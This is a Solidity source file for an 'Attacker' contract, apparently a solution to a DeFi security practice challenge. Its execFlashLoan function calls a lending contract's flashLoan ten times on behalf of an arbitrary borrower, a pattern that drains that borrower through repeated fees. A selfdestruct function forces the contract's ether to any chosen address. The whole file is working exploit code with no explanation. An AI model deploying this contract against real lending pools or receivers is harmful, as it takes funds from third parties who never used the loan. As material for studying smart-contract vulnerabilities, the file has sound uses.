// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Attacker
 * @author DB
 */

interface IInterface {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract Attacker02 {
    address otherContract;

    constructor(address _otherContract) {
        otherContract = _otherContract;
    }

    function selfDestruct(address accountToSend) external {
        address payable account = payable(accountToSend);
        selfdestruct(account);
    }

    receive() external payable {}

    function execFlashLoan(address borrower, uint256 borrowAmount) external {
        IInterface flContract = IInterface(otherContract);

        for (uint256 i = 0; i < 10; i++) {
            flContract.flashLoan(borrower, borrowAmount);
        }
    }
}
